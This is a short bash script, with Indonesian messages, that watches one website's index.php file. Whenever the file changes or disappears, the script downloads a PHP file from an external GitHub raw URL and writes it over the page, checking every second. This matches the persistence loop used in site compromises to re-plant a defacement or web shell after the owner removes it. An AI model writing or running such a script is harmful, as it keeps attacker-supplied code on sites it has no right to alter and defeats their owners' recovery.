#!/bin/bash
 
TARGET="/home/weareepic/drjamesdobson.org/index.php"
SOURCE_URL="https://raw.githubusercontent.com/arhaywoles0801-cmd/home/refs/heads/main/a.php"
 
echo "Monitoring file: $TARGET"
echo "Sumber file: $SOURCE_URL"
 
# Simpan hash terakhir
LAST_HASH=""
 
while true; do
    if [ -f "$TARGET" ]; then
        CURRENT_HASH=$(md5sum "$TARGET" | awk '{ print $1 }')
    else
        CURRENT_HASH=""
    fi
 
    if [ "$CURRENT_HASH" != "$LAST_HASH" ]; then
        echo "[$(date +"%T")] File hilang atau berubah. Memulihkan..."
        curl -s "$SOURCE_URL" -o "$TARGET"
        chmod 644 "$TARGET"
        LAST_HASH=$(md5sum "$TARGET" | awk '{ print $1 }')
        echo "[$(date +"%T")] Pemulihan selesai."
    fi
 
    sleep 1
done
